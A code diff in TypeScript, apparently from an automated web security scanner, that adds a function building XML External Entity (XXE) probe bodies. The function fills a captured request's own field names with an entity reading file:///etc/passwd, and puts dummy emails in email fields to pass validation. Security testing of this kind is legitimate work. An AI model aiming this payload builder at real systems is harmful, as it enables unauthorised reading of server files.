@@ -140,3 +140,20 @@ export function graftDevice(bodyJson: string, device: Record<string, unknown> | 
   walk(obj, 0);
   return JSON.stringify(obj);
 }
+
+/** Build a schema-aware XXE probe body from a captured JSON request's data field NAMES.
+ * The target app parses XML into the SAME field elements it expects as JSON (e.g. a
+ * contactUs form's <name>/<email>/<message>), and only reflects a field it recognizes — a
+ * generic <x>&xxe;</x> is rejected by the validator. So we emit one element per field,
+ * putting the external-entity reference in every non-email field (email fields get a
+ * benign address to pass format validation) to hit whichever field the app echoes back.
+ * Generic: field names come from the app's own captured request, nothing is hardcoded. */
+export function buildXxeXml(fieldNames: string[], filePath = "file:///etc/passwd"): string {
+  const uniq = Array.from(new Set(fieldNames.map((f) => f.split(".").pop() || f).filter(Boolean)));
+  const fields = uniq.length ? uniq : ["name"];
+  const els = fields.map((f) => {
+    const val = classifyContactField(f) === "email" ? "sahwxxe@example.test" : "&xxe;";
+    return `<${f}>${val}</${f}>`;
+  }).join("");
+  return `<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "${filePath}">]><r>${els}</r>`;
+}
